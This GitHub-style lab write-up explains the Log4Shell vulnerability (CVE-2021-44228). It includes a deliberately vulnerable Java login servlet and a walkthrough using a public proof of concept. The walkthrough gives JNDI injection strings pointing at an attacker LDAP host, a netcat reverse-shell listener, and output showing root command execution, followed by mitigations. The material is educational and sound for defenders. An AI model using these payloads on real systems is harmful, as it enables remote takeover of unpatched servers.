# üé• Log4Shell Vulnerability

## üîé What is CVE ?
üí¨
![image](https://user-images.githubusercontent.com/118449010/206201960-90658f31-3830-43e9-9488-7a41e0aaaba8.png)
> CVE is short for `Common Vulnerabilities and Exposures.` It means publicly known information-security vulnerabilities in publicly released software packages. The informaion is then assigend a CVE ID by a CVE Numbering Authority, CNA. CVEs help IT organizations to more systematically identify security flaws and compensate for vulnerabilities. And it consists of a structure in the order of prefix, year, and numbering.
> #### <div align=center> CVE(Prefix) - 1996(Year) - 0224(Numbering) </div>
> 



## üîé What is Log4Shell ?
üí¨
>**The Log4j vulnerability CVE-2021-44228, aka ‚ÄúLog4Shell.‚Äù** When Log4Shell outputs the log, the log is not only written with message data, but also automatically accesses the directory service using JNDI. By doing so, It may provide a function of converting to a name or downloading a Java object. The attacker exploits this function to connect the victim server to the attacker server to download malicious Java objects. As a result, the malicious code can be used to steal server privileges.
>

## :recycle: Log4Shell Attack Life-Cycle
![Î°úÍ∑∏Ìè¨ÏâòÎùºÏù¥ÌîÑÏÇ¨Ïù¥ÌÅ¥](https://user-images.githubusercontent.com/118449010/206230106-572b03e3-ea51-430f-abe2-c50e3705920f.png)
```
Attacker sends a JNDI Query into the User-Agent that causes injection to exposed server.
Í≥µÍ≤©ÏûêÎäî Log4j Ï∑®ÏïΩÏ†êÏóê ÎÖ∏Ï∂úÎêòÏñ¥ ÏûàÎäî ÏÑúÎ≤ÑÎ•º ÎåÄÏÉÅÏúºÎ°ú User-AgentÏóê JNDI InjectionÏùÑ Ïú†Î∞úÌïòÎäî JNDI ÏøºÎ¶¨Î•º ÏÇΩÏûÖÌï©ÎãàÎã§.
- ex) User-Agent: ${jndi:ldap://attacker.com/a}
```

```
JNDI string is logged by Log4j. Log4j parses the string and reaches out to the Attacker's LDAP Server.
JNDI ÏøºÎ¶¨ Ïä§Ìä∏ÎßÅÏù¥ Log4jÏóê ÏùòÌï¥ Î°úÍπÖÎêòÎäî Í≥ºÏ†ïÏóêÏÑú LDAP ÏøºÎ¶¨Î•º Ïã§ÌñâÌïòÍ≤å ÎêòÍ≥† Í≥µÍ≤©ÏûêÍ∞Ä ÏßÄÏ†ïÌïú LDAP ÏÑúÎ≤ÑÎ°ú ÏøºÎ¶¨Î•º Ìï©ÎãàÎã§.
- ex) log.info("User-Agent : ${jndi:ldap://attacker.com/a}");
```

```
LDAP Server responds hostile address(attacker/Exploit.class) that include malicious java class(Exploit.class).
Í≥µÍ≤©ÏûêÎäî ÏøºÎ¶¨Ïóê ÎåÄÌïú ÏùëÎãµÏúºÎ°ú ÏïÖÏÑ± JAVA ÌÅ¥ÎûòÏä§(Exploit.class)Í∞Ä ÏúÑÏπòÌïú Ï£ºÏÜå(attacker/Exploit.class)Î•º Î≥¥ÎÉÖÎãàÎã§.
```

```
Vulnerable application loads java class and executes malicious code + LDAP server returns with malicious java code.
Ï∑®ÏïΩÌïú Log4Shell ÏÑúÎ≤ÑÎäî attacker.com/Ïóê ÏúÑÏπòÌïú Exploit.classÎ•º Îã§Ïö¥Î°úÎìú Î∞õÍ≤å ÎêòÍ≥† Ïù¥Î•º Ïã§ÌñâÌïòÎ©¥ÏÑú Îã§ÏñëÌïú Í≥µÍ≤©Ïù¥ Í∞ÄÎä•ÌïòÍ≤å Îê©ÎãàÎã§.
```

## :closed_book: Attackable Versions
### CVE-2021-44228 `RCE: Remote Code Execution Vulnerability`
```
2.0-beta9 ~ 2.14.1 Version
‚Äª Exception: Log4j v2.3.1, v2.12.2, v2.12.3
```

## üîé What is JNDI ?
![image](https://user-images.githubusercontent.com/118449010/206211470-ababeb61-c94b-403a-aeea-d10044c716af.png)
üí¨
> JNDI is short for Java Naming and Directory Interface. It provides an API for applications to interact with remote objects registered with the RMI registry or directory services like LDAP. JNDI has a number of service provider interfaces (SPIs) that enable it to use a variety of directory service like RMI(Remote Method),CORBRA(Common Object Request Broket Architecture), LDAP(Lightweight Directory Access Protocol), and DNS(Domain Name Service). For example, if we access the URL `ldap://localhost:3389/o=test`, then we can find the 'test' object on the LDAP server. When we do this Jndi Lookup, This is because Java class files can be downloaded and executed without verifying the unsafe(hostile) server. Eventually, if the attacker finds out where it is logged, then just add a value like `${jndi:ldap://attacker.com/a}`. Vulnerabilities can be exploited.
> 

## üîé What is LDAP ?
![image](https://user-images.githubusercontent.com/118449010/206211657-252fad04-2114-49ee-a575-cbfb24fc2440.png)
üí¨
> LDAP is short for Lightweight Directory Access Protocol. LDAP is application protocol for accessing and modifying directory services. one of the disadvantages of RDBMS is Lack of Speed. LDAP is used to compensate for the problem often. also, LDAP is suitable for roles that not update frequently and require a lot of search requests. + It is mainly used for other services for authentication(and authorization).
> 

## :hammer: Tool
### Victim Information
<img src="https://img.shields.io/badge/Ubuntu-FFB71B?style=for-the-badge&logo=Ubuntu&logoColor=black"> <img src="https://img.shields.io/badge/Apache-D22128?style=for-the-badge&logo=Apache&logoColor=white"> <img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=VMware&logoColor=white"> 

- **OS**: Ubuntu 18.04.6-live-server-amd64
- **IP**: 192.168.0.138
- **Log4j**: 2.14.1

### Attacker Information
<img src="https://img.shields.io/badge/Kali Linux-557C94?style=for-the-badge&logo=Kali Linux&logoColor=white"> <img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=VMware&logoColor=white"> 
- **OS**: Kali Linux
- **IP**: 192.168.0.15
- **LDAP Port**: 1389
- **Web Port**: 8000
- **nc Port**: 9001


## üìÑ Vulnerable Web site LoginServlet.java source code 
```
package com.example.log4shell;

import java.io.*;
import javax.servlet.ServletException;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import com.sun.deploy.net.HttpRequest;

@WebServlet(name = "loginServlet", value = "/login")
public class LoginServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        String userName = req.getParameter("username");
        String password = req.getParameter("password");

        resp.setContentType("text/html");
        PrintWriter out = resp.getWriter();
        out.println("<html><body>");

        if(userName.equals("admin") && password.equals("password")){
            out.println("Hello Admin");
        }
        else{

            // vulnerable source code
            Logger logger = LogManager.getLogger(com.example.log4shell.log4j.class);
            logger.error(userName);

            out.println("<code> the password you entered was invalid, <u> we will log your information </u> </code>");
        }
    }
    
    public void destroy() {
    }
}
```

## üìÑ Exploit code [:link:](https://github.com/kozmer/log4j-shell-poc/blob/main/poc.py)


# üé• Attack Demonstration
## üíª Ubuntu 18.04.6
- Load Web site source code 
```
git clone https://github.com/kozmer/log4j-shell-poc
```
```
cd Desktop/log4j-shell-poc
```
```
docker build -t log4j-shell-poc
docker run --network host log4j-shell-poc
```
### :pager: localhost:8080
![Ïö∞Î∂ÑÌà¨1](https://user-images.githubusercontent.com/118449010/206264275-24619f02-c495-4f2e-99f2-6ed29e1986cb.png)

## üíª Kali Linux
- Load Exploit Code
```
git clone https://github.com/kozmer/log4j-shell-poc
```
```
cd log4j-shell-poc
```
- Install python3 library
```
pip3 install -r requirements.txt
```

- Reverse-Shell Connection: set listen mode, for inbound connects and set the source port 9001
```
#nc -l -p port [options] [hostname] [port]
nc -nlvp 9001
```
![nc -nlvp 9001](https://user-images.githubusercontent.com/118449010/206267519-eee76337-5d4e-4d37-8e00-96e4602bfc2b.png)

- Start exploit with poc.py
```
python3 poc.py --userip [Attacker ip: 192.168.0.15] --webport 8000 --lport [nc Listening port: 9001]
```
![python3 pocpy](https://user-images.githubusercontent.com/118449010/206267523-c6d71dcd-892b-4833-bfdd-d362f0c00975.png)

- JNDI LDAP Query Injection
```
 ${jndi:ldap://192.168.128.139:1389/a}
```
![ÏπºÎ¶¨2(Ïù∏Ï†ùÏÖò)](https://user-images.githubusercontent.com/118449010/206268053-9c21aa41-ea54-46ad-9815-75d027123b6c.png)
```
UserName:  ${jndi:ldap://192.168.128.139:1389/a}
Password: Injection
```

## :scroll: Result
- Reverse Shell connection
![ncÏª§ÎÑ•ÏÖò](https://user-images.githubusercontent.com/118449010/206268675-94a535dc-5f81-4a39-acba-51e0a4fd3604.png)

- LDAP Query from vulnerable web server returns path of Exploit.class
![sendldap](https://user-images.githubusercontent.com/118449010/206268681-a7fd4e55-e6e1-4701-a114-db1a180637db.png)

- Remote Code Execution: `id`
![id](https://user-images.githubusercontent.com/118449010/206269604-0f6a247f-6f0d-4583-a03d-a66d880fa9ac.png)
   ```
   Enter: id
   Result: uid=0(root) gid=0(root) groups=0(root)
   ```

- Remote Code Execution: `hostname -I`
![hostname-i](https://user-images.githubusercontent.com/118449010/206269609-17536072-3145-4c6c-abca-9d6c4a03bf0a.png)
  ```
  Enter: hostname -I
  Result: 192.168.0.138 172.17.0.1
  ```

## üîé Prevent-Solution
- **Block with WAF**
- **Disable LOG4j**
- **Patch Log4j**
- **Disable JNDI Lookups**
- **Disable Remote codebases**

![header](https://capsule-render.vercel.app/api?type=waving&color=auto&height=300&section=header&text=KWAK%20JOONHWAN&fontSize=90)
